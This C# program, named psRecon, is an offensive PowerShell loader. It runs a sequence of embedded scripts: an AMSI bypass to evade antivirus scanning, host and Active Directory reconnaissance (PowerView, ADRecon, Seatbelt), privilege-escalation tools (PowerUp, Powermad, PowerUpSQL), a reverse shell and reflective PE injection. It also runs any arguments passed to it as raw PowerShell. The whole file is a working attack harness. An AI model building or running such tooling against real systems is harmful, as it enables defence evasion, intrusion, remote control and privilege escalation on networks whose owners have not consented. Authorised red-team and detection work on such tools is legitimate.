using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;

namespace psRecon
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // Create and open a runspace
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();

                // Create a PowerShell instance
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;

                    // Execute embedded scripts
                    RunEmbeddedScript(ps, "psRecon.Scripts.AmsiBypass.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.HostRecon.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.PowerUp.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.PowerView.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.Powermad.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.ADRecon.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.ReverseShell.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.LAPSToolkit.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.Invoke-Seatbelt.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.PowerUpSQL.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.ApplockerRecon.ps1");
                    RunEmbeddedScript(ps, "psRecon.Scripts.Invoke-ReflectivePEInjection.ps1");

                    // Execute the raw PowerShell command passed as an argument (if any)
                    if (args.Length > 0)
                    {
                        string rawCommand = string.Join(" ", args); // Combine arguments into a single command
                        Console.WriteLine($"Running argument as PowerShell command: {rawCommand}");
                        RunRawPowerShell(ps, rawCommand);
                    }
                }

                // Close the runspace
                runspace.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        private static void RunEmbeddedScript(PowerShell ps, string resourceName)
        {
            string scriptContent = LoadEmbeddedResource(resourceName);
            if (string.IsNullOrEmpty(scriptContent))
            {
                Console.WriteLine($"Error: Script {resourceName} not found or empty.");
                return;
            }

            Console.WriteLine($"Running embedded script: {resourceName}");
            ExecutePowerShell(ps, scriptContent);
        }

        private static void RunRawPowerShell(PowerShell ps, string rawCommand)
        {
            Console.WriteLine($"Running raw PowerShell command: {rawCommand}");
            ExecutePowerShell(ps, rawCommand);
        }

        private static void ExecutePowerShell(PowerShell ps, string scriptContent)
        {
            // Add the PowerShell script or command to the pipeline
            ps.AddScript(scriptContent);

            // Invoke the script and capture the results
            var results = ps.Invoke();

            // Display output
            Console.WriteLine("=== PowerShell Output ===");
            foreach (var result in results)
            {
                Console.WriteLine(result.ToString());
            }

            // Display errors, if any
            if (ps.Streams.Error.Count > 0)
            {
                Console.WriteLine("=== PowerShell Errors ===");
                foreach (var error in ps.Streams.Error)
                {
                    Console.WriteLine(error.ToString());
                }
            }

            // **Flush the console output**
            Console.Out.Flush();

            // Clear commands to prepare for the next script or command
            ps.Commands.Clear();
        }


        private static string LoadEmbeddedResource(string resourceName)
        {
            try
            {
                // Get the current assembly
                Assembly assembly = Assembly.GetExecutingAssembly();

                // Load the resource stream
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        return null; // Resource not found
                    }

                    using (StreamReader reader = new StreamReader(stream))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error loading resource: " + ex.Message);
                return null;
            }
        }
    }
}